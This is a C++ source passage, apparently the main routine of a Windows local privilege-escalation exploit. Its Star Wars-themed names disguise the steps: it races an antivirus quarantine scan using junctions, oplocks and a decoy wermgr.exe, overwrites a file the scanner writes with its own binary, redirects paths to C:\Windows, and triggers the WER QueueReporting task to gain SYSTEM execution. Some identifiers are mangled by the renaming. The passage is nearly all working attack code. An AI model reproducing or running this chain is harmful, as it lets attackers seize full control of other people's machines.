    HANDLE hDetentionBlock = nullptr;
    stat = NtCreateFile(&hDetentionBlock,
        GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE,
        &oaDetentionBlock, &iosb, nullptr, 0, FILE_SHARE_READ,
        FILE_CREATE, FILE_DIRECTORY_FILE, nullptr, 0);
    if (stat != STATUS_SUCCESS) {
        wprintf(L"[!] Failed to create sink dir: 0x%08X\n", stat);
        NtClose(hShuttleBay);
        return 1;
    }

    // STAGE 3: Write Contraband decoy file into <rebelBase>\System32\wermgr.exe
    wchar_t decoyPath[MAX_PATH] = {};
    swprintf_s(decoyPath, L"%s\\wermgr.exe", shuttleBayName + 4); // skip \??\ prefix
    HANDLE hDecoyProbe = PlantDecoyProbe(decoyPath);
    if (!hDecoyProbe) {
        NtClose(hDetentionBlock);
        NtClose(hShuttleBay);
        return 1;
    }

    // Set scan path for Empire thread
    swprintf_s(g_ImperialTarget, L"%s\\System32\\wermgr.exe", rebelBase);
    wprintf(L"[*] decoy file: %ws\n", g_ImperialTarget);

    // STAGE 4: Start Imperial probe scan in background thread
    wprintf(L"[*] Starting Imperial probe scan thread...\n");
    DWORD tid = 0;
    HANDLE hImperialProbe = CreateThread(nullptr, 0,
        ImperialProbePatrol, nullptr, 0, &tid);
    if (!hImperialProbe) {
        wprintf(L"[!] Failed to create scan thread: %d\n", GetLastError());
        NtClose(hDecoyProbe);
        NtClose(hDetentionBlock);
        NtClose(hShuttleBay);
        return 1;
    }

    // STAGE 5: Start force disturbances to widen race window
    SYSTEM_INFO si = {};
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors > 2) {
        wprintf(L"[*] Starting %u force disturbances...\n", si.dwNumberOfProcessors);
        HANDLE hForceDisturbance = CreateThread(nullptr, 0, ForceMeditation, nullptr, 0, nullptr);
        for (DWORD i = 0; i < si.dwNumberOfProcessors; i++) {
            CreateThread(nullptr, 0, ForcePush, nullptr, 0, nullptr);
        }
        SetEvent(g_ForceAwakens);
        if (hForceDisturbance) CloseHandle(hForceDisturbance);
    }

    // STAGE 6: Wait for Empire to create a new Holocron
    wchar_t holocronPath[MAX_PATH] = {};
    FindNewHolocron(holocronPath, MAX_PATH);
    if (holocronPath[0] == L'\0') {
        wprintf(L"[!] No new Holocron found. Empire may not have triggered.\n");
        goto cleanup;
    }

    // STAGE 7: Place Tractor Beam on the ADS of the file inside the Holocron
    // This blocks the Empire's Holocron cleanup, giving us a timing anchor.
    {
        wchar_t holocronStream[MAX_PATH] = {};
        swprintf_s(holocronStream,
            L"%s\\%s\\System32\\wermgr.exe:WDFOO",
            holocronPath, &rebelBase[3]); // skip drive letter from rebelBase
        UNICODE_STRING uHolocron = {};
        RtlInitUnicodeString(&uHolocron, holocronStream);
        OBJECT_ATTRIBUTES oaHolocron = {};
        InitializeObjectAttributes(&oaHolocron, &uHolocron,
            OBJ_CASE_INSENSITIVE, nullptr, nullptr);
        HANDLE hHolocron = nullptr;
        IOSB = {};
        stat = NtCreateFile(&hHolocron,
            GENERIC_READ | SYNCHRONIZE, &oaHolocron, &iosb, nullptr,
            0, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            FILE_OPEN, FILE_NON_DIRECTORY_FILE, nullptr, 0);
        if (stat == STATUS_SUCCESS) {
            wprintf(L"[*] Tractor Beaming Holocron file...\n");
            REQUEST_Tractor Beam_INPUT_BUFFER inBuf = {
                sizeof(inBuf), REQUEST_Tractor Beam_CURRENT_VERSION,
                Tractor Beam_LEVEL_CACHE_READ | Tractor Beam_LEVEL_CACHE_HANDLE,
                REQUEST_Tractor Beam_INPUT_FLAG_REQUEST };
            REQUEST_Tractor Beam_OUTPUT_BUFFER outBuf = {
                sizeof(outBuf), REQUEST_Tractor Beam_CURRENT_VERSION };
            DWORD cb = 0;
            OVERLAPPED ov = {};
            ov.hEvent = CreateEventW(nullptr, FALSE, FALSE, nullptr);
            DeviceIoControl(hHolocron, FSCTL_REQUEST_Tractor Beam,
                &inBuf, sizeof(inBuf), &outBuf, sizeof(outBuf), &cb, &ov);
            WaitForSingleObject(ov.hEvent, INFINITE);
            CloseHandle(ov.hEvent);
            wprintf(L"[+] Tractor Beam acquired on Holocron file.\n");
            NtClose(hHolocron);
        } else {
            wprintf(L"[!] Cannot open Holocron file: 0x%08X (continuing anyway)\n", stat);
        }
    }

    // STAGE 8: Delete the original decoy file (supersede + move)
    {
        UNICODE_STRING uVaporize = {};
        RtlInitUnicodeString(&uVaporize, decoyPath);
        OBJECT_ATTRIBUTES oaVaporize = {};
        InitializeObjectAttributes(&oaVaporize, &uVaporize,
            OBJ_CASE_INSENSITIVE, nullptr, nullptr);
        HANDLE hDisintegrate = nullptr;
        stat = NtCreateFile(&hDisintegrate, DELETE,
            &oaVaporize, &iosb, nullptr, FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            FILE_SUPERSEDE, FILE_NON_DIRECTORY_FILE, nullptr, 0);
        if (stat == STATUS_SUCCESS) {
            JumpToHyperspace(hDisintegrate);
            NtClose(hDisintegrate);
        }
    }
    NtClose(hDecoyProbe);

    // STAGE 9: Create hyperspace lane: shuttle bay -> detention block
    // Empire will now write into wdtest_temp instead of System32
    wchar_t detentionBlockTarget[MAX_PATH] = {};
    swprintf_s(detentionBlockTarget, L"\\??\\%s\\wdtest_temp", rebelBase);
    if (!OpenHyperspaceLane(hShuttleBay, detentionBlockTarget)) {
        wprintf(L"[!] Failed to create hyperspace lane to sink dir.\n");
        goto cleanup;
    }
    wprintf(L"[+] hyperspace lane created: %ws -> sink dir\n", shuttleBayName);

    // STAGE 10: Monitor C:\Windows for the Empire's temp directory creation
    // Empire creates Temp\TMPXXXXX (24 chars) during quarantine/cleanup
    {
        HANDLE hImperialCommand = CreateFileW(L"C:\\Windows",
            GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            nullptr, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, nullptr);
        if (hImperialCommand == INVALID_HANDLE_VALUE) {
            wprintf(L"[!] Cannot open C:\\Windows: %d\n", GetLastError());
            goto cleanup;
        }
        wprintf(L"[*] Waiting for Empire to create Temp\\TMP* dir in C:\\Windows...\n");
        char buf[0x1000] = {};
        const wchar_t* pattern = L"Temp\\TMP";
        for (;;) {
            ZeroMemory(buf, sizeof(buf));
            DWORD retBytes = 0;
            if (!ReadDirectoryChangesW(hImperialCommand, buf, sizeof(buf),
                TRUE, FILE_NOTIFY_CHANGE_FILE_NAME, &retBytes, nullptr, nullptr))
                break;
            auto* fni = (FILE_NOTIFY_INFORMATION*)buf;
            if (fni->FileNameLength / 2 == 24 &&
                _wcsnicmp(pattern, fni->FileName, 8) == 0) {
                wprintf(L"[+] Empire temp dir detected: Temp\\%ws\n", fni->FileName);
                break;
            }
        }
        NtClose(hImperialCommand);
    }

    // STAGE 11: Write Contraband again (now through hyperspace lane -> wdtest_temp)
    wchar_t decoyPath2[MAX_PATH] = {};
    swprintf_s(decoyPath2, L"%s\\wermgr.exe", shuttleBayName + 4);
    HANDLE hDecoyProbe2 = PlantDecoyProbe(decoyPath2);
    if (hDecoyProbe2) {
        NtClose(hDecoyProbe2);
    }

    // STAGE 12: Monitor wdtest_temp for Empire writing files
    wprintf(L"[*] Waiting for Empire to write into wdtest_temp...\n");
    wchar_t interceptedTransmission[MAX_PATH] = {};
    {
        char buf[0x1000] = {};
        DWORD retBytes = 0;
        if (!ReadDirectoryChangesW(hDetentionBlock, buf, sizeof(buf),
            TRUE, FILE_NOTIFY_CHANGE_SIZE, &retBytes, nullptr, nullptr))
        {
            auto* fni = (FILE_NOTIFY_INFORMATION*)buf;
            // skip "." and ".." notifications
            if (wcscmp(fni->FileName, L"wermgr.exe") != 0) {
                wcscpy_s(interceptedTransmission, fni->FileName);
                wprintf(L"[+] Empire wrote file: %ws\n", interceptedTransmission);
            }
        }
    }

    // STAGE 13: Delete the hyperspace lane (restore decoyDir to normal directory)
    CloseHyperspaceLane(hShuttleBay);
    wprintf(L"[*] hyperspace lane removed from decoy directory.\n");

    // STAGE 14: Open the file Empire created, overwrite with our binary
    if (interceptedTransmission[0] != L'\0') {
        wchar_t interceptedPath[MAX_PATH] = {};
        swprintf_s(interceptedPath, L"%s\\%s",
            shuttleBayName + 4, interceptedTransmission);
        UNICODE_STRING uIntercepted = {};
        RtlInitUnicodeString(&uIntercepted, interceptedPath);
        OBJECT_ATTRIBUTES oaIntercepted = {};
        InitializeObjectAttributes(&oaIntercepted, &uIntercepted,
            OBJ_CASE_INSENSITIVE, nullptr, nullptr);
        HANDLE hIntercepted = nullptr;
        IOSB = {};
        stat = NtCreateFile(&hIntercepted,
            GENERIC_READ | GENERIC_WRITE | DELETE,
            &oaIntercepted, &iosb, nullptr, FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            FILE_OVERWRITE_IF, FILE_NON_DIRECTORY_FILE, nullptr, 0);
        if (stat == STATUS_SUCCESS) {
            // Read our own binary
            wchar_t xwingPath[MAX_PATH] = {};
            GetModuleFileNameW(nullptr, xwingPath, MAX_PATH);
            HANDLE hXWing = CreateFileW(xwingPath,
                GENERIC_READ,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (hXWing != INVALID_HANDLE_VALUE) {
                LARGE_INTEGER fileSize = {};
                GetFileSizeEx(hXWing, &fileSize);
                void* xwingData = malloc((size_t)fileSize.QuadPart);
                DWORD readBytes = 0;
                if (ReadFile(hXWing, xwingData, (DWORD)fileSize.QuadPart,
                    &readBytes, nullptr)) {
                    DWORD written = 0;
                    WriteFile(hIntercepted, xwingData, readBytes, &written, nullptr);
                    wprintf(L"[+] Overwrote Empire file with our binary (%d bytes).\n", written);
                }
                free(xwingData);
                CloseHandle(hXWing);
            }
            JumpToHyperspace(hIntercepted);
            NtClose(hIntercepted);
        }
    }

    // STAGE 15: Move directories around, then create hyperspace lane from
    // rebelBase to C:\Windows to hijack WER task resolution paths.
    JumpToHyperspace(hDetentionBlock);
    JumpToHyperspace(hShuttleBay);

    // Create hyperspace lane: <rebelBase> -> C:\Windows
    {
        wchar_t rebelBasePath[MAX_PATH] = {};
        swprintf_s(rebelBasePath, L"\\??\\%s", rebelBase);
        UNICODE_STRING uRebelBase = {};
        RtlInitUnicodeString(&uRebelBase, rebelBasePath);
        OBJECT_ATTRIBUTES oaRebelBase = {};
        InitializeObjectAttributes(&oaRebelBase, &uRebelBase,
            OBJ_CASE_INSENSITIVE, nullptr, nullptr);
        HANDLE hRebelBase = nullptr;
        IOSB = {};
        stat = NtCreateFile(&hRebelBase, FILE_WRITE_ATTRIBUTES,
            &oaRebelBase, &iosb, nullptr, 0,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            FILE_OPEN, FILE_DIRECTORY_FILE, nullptr, 0);
        if (stat == STATUS_SUCCESS) {
            OpenHyperspaceLane(hRebelBase, L"\\??\\C:\\Windows");
            NtClose(hRebelBase);
            wprintf(L"[+] Hook hyperspace lane set: %ws -> C:\\Windows\n", rebelBase);
        }
    }

    // STAGE 16: Wait for Imperial probe scan thread to finish
    wprintf(L"[*] Waiting for Imperial probe scan to complete...\n");
    WaitForSingleObject(hImperialProbe, 60000);
    CloseHandle(hImperialProbe);

    // STAGE 17: Trigger the WER QueueReporting task as EMPEROR
    wprintf(L"[*] Triggering WER QueueReporting task (EMPEROR)...\n");
    if (!ActivateImperialProtocol()) {
        wprintf(L"[!] Failed to trigger WER task.\n");
    }

    // STAGE 18: Wait for EMPEROR callback via named pipe
    wprintf(L"[*] Waiting for EMPEROR callback via named pipe...\n");
    {
        HANDLE hHoloComm = CreateNamedPipeW(
            L"\\\\.\\pipe\\HoloComm",
            PIPE_ACCESS_DUPLEX, PIPE_WAIT,
            PIPE_UNLIMITED_INSTANCES, 0, 0, 0, nullptr);
        if (hHoloComm != INVALID_HANDLE_VALUE) {
            ConnectNamedPipe(hHoloComm, nullptr);
            // The EMPEROR process has connected and launched the console.
            CloseHandle(hHoloComm);
        }
    }

    // Cleanup
    g_ForceSleep = true;
    Sleep(500);
    wprintf(L"[+] Exploit chain complete.\n");
    return 0;

cleanup:
    g_ForceSleep = true;
    Sleep(500);
    NtClose(hShuttleBay);
    NtClose(hDetentionBlock);
    if (hImperialProbe) { WaitForSingleObject(hImperialProbe, 5000); CloseHandle(hImperialProbe); }
    wprintf(L"[!] Exploit failed. Check output above for errors.\n");
    return 1;
}
